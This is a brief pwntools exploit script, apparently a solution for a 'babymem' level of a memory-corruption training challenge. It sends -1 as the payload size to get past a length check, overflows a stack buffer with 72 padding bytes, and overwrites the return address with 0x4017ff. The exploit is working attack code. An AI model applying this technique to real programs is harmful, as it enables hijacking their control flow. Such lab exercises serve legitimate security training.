from pwn import *

p = process("./babymem-level-4-0")

payload = b""
payload += b"A" * 45
payload += b"B" * 27
payload += p64(0x4017ff)

p.recvuntil(b"Payload size: ")

p.sendline(b"-1")

p.recvuntil(b"Send your payload (up to -1 bytes)!\n")

p.sendline(payload)

p.interactive()
